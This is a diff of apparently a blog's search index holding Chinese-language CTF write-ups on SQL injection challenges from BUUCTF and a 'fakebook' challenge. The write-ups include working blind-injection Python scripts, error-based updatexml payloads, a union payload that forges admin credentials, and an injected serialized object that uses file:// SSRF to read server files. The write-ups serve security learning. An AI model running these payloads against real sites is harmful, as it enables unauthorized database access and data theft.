-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i, j</span>):</span>
-    time.sleep(<span class="hljs-number">1</span>)
-    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span>
-    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span>
-    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span>
-    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)
-    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;
-    r = requests.get(url, params=data)
-    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:
-        res = <span class="hljs-number">1</span>
-    <span class="hljs-keyword">else</span>:
-        res = <span class="hljs-number">0</span>
-    <span class="hljs-keyword">return</span> res
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
-    <span class="hljs-keyword">global</span> flag
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
-        print(i, <span class="hljs-string">&#x27;:&#x27;</span>)
-        low = <span class="hljs-number">31</span>
-        high = <span class="hljs-number">127</span>
-        <span class="hljs-keyword">while</span> low &lt;= high:
-            mid = (low + high) // <span class="hljs-number">2</span>
-            res = payload(i, mid)
-            <span class="hljs-keyword">if</span> res:
-                low = mid + <span class="hljs-number">1</span>
-            <span class="hljs-keyword">else</span>:
-                high = mid - <span class="hljs-number">1</span>
-        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
-        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
-            <span class="hljs-keyword">break</span>
-        <span class="hljs-comment"># print (f)</span>
-        flag += <span class="hljs-built_in">chr</span>(f)
-        print(flag)
-exp()
-print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
-
-<p>又学到了新的注入姿势，真不错</p>
-<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
-]]></content>
-      <categories>
-        <category>buuoj</category>
-      </categories>
-      <tags>
-        <tag>二分注入</tag>
-        <tag>报错注入</tag>
-        <tag>union新姿势</tag>
       </tags>
   </entry>
   <entry>
@@ -1078,6 +1077,214 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </tags>
   </entry>
   <entry>
+    <title>buuctf-sql注入</title>
+    <url>/2020/10/05/buuoj/</url>
+    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><span id="more"></span>
+
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
+<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
+<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
+<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" alt></p>
+<p>构造盲注语句</p>
+<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
+<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" alt></p>
+<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
+<pre><code class="hljs python">// 二分注入
+<span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>
+
+data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;
+
+flag = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">33</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(right&gt;left):
+
+        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        response = requests.post(url,data=data)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    flag = flag + <span class="hljs-built_in">chr</span>(mid)
+    print(flag)
+
+print(flag)</code></pre>
+
+
+
+
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
+<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
+<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" alt></p>
+<p>可是使用报错注入</p>
+<blockquote>
+<p>报错注入原理：</p>
+<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
+</blockquote>
+<p>相关链接</p>
+<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
+<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
+<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
+</blockquote>
+<p>查询语句如下</p>
+<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
+
+?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
+
+?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>
+
+<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
+<p>显示后面的flag</p>
+<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>
+
+
+
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
+<pre><code class="hljs php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
+<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
+<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];
+<span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
+<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;
+<span class="hljs-comment">// echo $sql;</span>
+<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);
+
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
+	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;
+		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));
+		<span class="hljs-keyword">exit</span>();
+	&#125;
+	<span class="hljs-keyword">else</span>&#123;
+		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
+		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);
+		<span class="hljs-comment">// print_r($arr);</span>
+		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;
+			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
+				<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+			&#125;
+			<span class="hljs-keyword">else</span>&#123;
+				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
+			&#125;
+		&#125;
+		<span class="hljs-keyword">else</span>&#123;
+			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
+		&#125;
+	&#125;
+&#125;</code></pre>
+
+<p>随便输入用户名和密码，查看源码，出现提示</p>
+<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" alt></p>
+<p>试了试应该是base32，解码后是base64</p>
+<pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre>
+
+<p>继续解码</p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>
+
+<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
+<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
+<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
+<p>值得注意的是，这题可以知道username是admin，</p>
+<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
+<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
+<p>接下来介绍一种新的union注入</p>
+<p>先建立一张表</p>
+<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" alt></p>
+<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre>
+
+<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
+<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" alt></p>
+<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
+<p>这里就是 id=1,username=admin,password=2322</p>
+<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
+<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
+<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
+<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
+<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
+<p>payload:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">name</span>=<span class="hljs-number">000</span>&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;b<span class="hljs-number">59</span>c<span class="hljs-number">67</span>bf<span class="hljs-number">196</span>a<span class="hljs-number">4758191</span>e<span class="hljs-number">42</span>f<span class="hljs-number">76670</span>ceba&#x27;#&amp;pw=<span class="hljs-number">1111</span></code></pre>
+
+<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
+<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" alt></p>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
+<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
+<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
+<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
+<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" alt="image-20201223090038080"></p>
+<pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
+<span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre>
+
+<p>所以可以将注入的payload加到中间，例如</p>
+<pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
+ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre>
+
+<p>注入脚本如下，使用的是二分法</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+url = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>
+flag = <span class="hljs-string">&#x27;&#x27;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i, j</span>):</span>
+    time.sleep(<span class="hljs-number">1</span>)
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span>
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span>
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span>
+    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)
+    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;
+    r = requests.get(url, params=data)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:
+        res = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">else</span>:
+        res = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
+    <span class="hljs-keyword">global</span> flag
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
+        print(i, <span class="hljs-string">&#x27;:&#x27;</span>)
+        low = <span class="hljs-number">31</span>
+        high = <span class="hljs-number">127</span>
+        <span class="hljs-keyword">while</span> low &lt;= high:
+            mid = (low + high) // <span class="hljs-number">2</span>
+            res = payload(i, mid)
+            <span class="hljs-keyword">if</span> res:
+                low = mid + <span class="hljs-number">1</span>
+            <span class="hljs-keyword">else</span>:
+                high = mid - <span class="hljs-number">1</span>
+        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
+        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-comment"># print (f)</span>
+        flag += <span class="hljs-built_in">chr</span>(f)
+        print(flag)
+exp()
+print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
+
+<p>又学到了新的注入姿势，真不错</p>
+<p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
+]]></content>
+      <categories>
+        <category>buuoj</category>
+      </categories>
+      <tags>
+        <tag>二分注入</tag>
+        <tag>报错注入</tag>
+        <tag>union新姿势</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>diaoyu</title>
     <url>/2020/07/18/diaoyu/</url>
     <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
@@ -1113,6 +1320,90 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </categories>
       <tags>
         <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fakebook</title>
+    <url>/2020/09/27/fakebook/</url>
+    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
+<span id="more"></span>
+
+<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
+<p>接下来继续注入的常规操作。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
+<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
+<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
+<p><strong>爆表名</strong></p>
+<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
+<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
+<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
+<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p>爆出一大堆列名。直接读取data的内容</p>
+<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
+<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
+<p>发现内容是注册时信息保存为序列化内容</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
+<p>到这里就不知道怎么办了。。。</p>
+<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
+<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
+    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
+    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$ch</span> = curl_init();
+
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
+    &#125;
+    curl_close(<span class="hljs-variable">$ch</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
+    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
+&#125;
+&#125;</code></pre>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
+<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
+
+<p>查看源码，解base64。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>unserailize</tag>
       </tags>
   </entry>
   <entry>
@@ -1465,133 +1756,6 @@ apt install <span class="hljs-keyword">vim</span></code></pre>
       </tags>
   </entry>
   <entry>
-    <title>fakebook</title>
-    <url>/2020/09/27/fakebook/</url>
-    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
-<span id="more"></span>
-
-<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
